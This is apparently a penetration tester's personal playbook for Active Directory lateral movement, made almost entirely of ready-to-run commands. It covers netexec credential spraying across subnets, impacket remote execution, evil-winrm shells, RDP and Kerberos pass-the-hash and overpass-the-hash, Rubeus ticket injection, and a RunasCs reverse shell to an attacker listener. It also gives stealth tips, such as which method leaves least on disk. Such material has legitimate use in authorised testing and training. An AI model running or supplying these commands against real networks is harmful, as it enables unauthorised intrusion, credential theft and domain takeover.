# AD lateral movement

## Before I start
sudo ntpdate <DCIP>
- [ ] A ticket below wants host names, not IPs: the target's FQDN and <DCHost> resolve
- [ ] What I hold: a password, an NT hash to pass with no cracking, or a Kerberos ticket

## Where the credential works
At the pwn-broker prompt: tool install netexec and tool install impacket.
nxc smb <Subnet>/<CIDR> -u '<Username>' -p '<Password>'
nxc smb <Subnet>/<CIDR> -u '<Username>' -H '<Hash>'
nxc winrm <TargetIP> -u '<Username>' -p '<Password>'
nxc mssql <TargetIP> -u '<Username>' -p '<Password>'
nxc rdp <TargetIP> -u '<Username>' -p '<Password>'
- [ ] (Pwn3d!) means admin on that host, enough for an exec method below
- [ ] A local account, not a domain one: add --local-auth
- [ ] The same password and hash tried against every host: that is how the next one falls

## Run a command, with a password or a hash
impacket-wmiexec '<Domain>/<Username>:<Password>@<TargetIP>'
impacket-wmiexec -hashes ':<Hash>' '<Domain>/<Username>@<TargetIP>'
- [ ] wmiexec makes no service and writes least to disk: my first choice
impacket-psexec '<Domain>/<Username>:<Password>@<TargetIP>'
impacket-smbexec '<Domain>/<Username>:<Password>@<TargetIP>'
impacket-atexec '<Domain>/<Username>:<Password>@<TargetIP>' whoami
- [ ] psexec drops a binary and makes a service as SYSTEM: loud, but SYSTEM at once
- [ ] smbexec makes a service with no binary on disk; atexec runs one command as a task

## A shell with WinRM
evil-winrm -i <TargetIP> -u '<Username>' -p '<Password>'
evil-winrm -i <TargetIP> -u '<Username>' -H '<Hash>'
- [ ] nxc winrm answered (Pwn3d!), or the user is in Remote Management Users

## RDP, including pass the hash
xfreerdp3 /v:<TargetIP> /u:<Username> /p:'<Password>' /cert:ignore /dynamic-resolution +clipboard
xfreerdp3 /v:<TargetIP> /u:<Username> /pth:<Hash> /cert:ignore /dynamic-resolution
- [ ] /pth needs Restricted Admin on the target: DisableRestrictedAdmin set to 0 in the registry
- [ ] A shell as another local user: tool install runascs, then RunasCs.exe from serve
.\RunasCs.exe <Username> '<Password>' cmd.exe -r <LHOST>:<LPORT>

## With a hash or a ticket, over Kerberos
impacket-getTGT '<Domain>/<Username>' -hashes ':<Hash>' -dc-ip <DCIP>
export KRB5CCNAME=THE-CCACHE
impacket-wmiexec -k -no-pass '<Domain>/<Username>@<DCHost>'
- [ ] Overpass-the-hash: getTGT turns the NT hash into a TGT, then -k -no-pass uses it
- [ ] A .kirbi from Windows converts to a ccache and back
impacket-ticketConverter THE-TICKET.kirbi THE-TICKET.ccache
- [ ] -k wants the FQDN, never the IP, or it fails with a Kerberos error

## From a Windows shell
At the pwn-broker prompt:
tool install rubeus
serve
serve files rubeus
On the Windows host:
- [ ] Rubeus.exe fetched with the line serve files gives
.\Rubeus.exe asktgt /user:<Username> /rc4:<Hash> /ptt
.\Rubeus.exe ptt /ticket:THE-TICKET.kirbi
Enter-PSSession -ComputerName <Hostname> -Credential <Domain>\<Username>
Invoke-Command -ComputerName <Hostname> -ScriptBlock { whoami } -Credential <Domain>\<Username>
PsExec from Sysinternals, https://learn.microsoft.com/sysinternals/downloads/psexec, in my upload/ folder:
.\PsExec.exe -accepteula \\<Hostname> -s cmd.exe
- [ ] With a ticket already in memory, drop -Credential and let Kerberos carry it

## Next
- [ ] Every host reached marked Owned in BloodHound, its paths read again
- [ ] Credentials and hashes pulled from each new host: :Pb acl-abuse, its host sections
- [ ] A host on another network: a pivot, :Pb ligolo, then :Pb smb through it
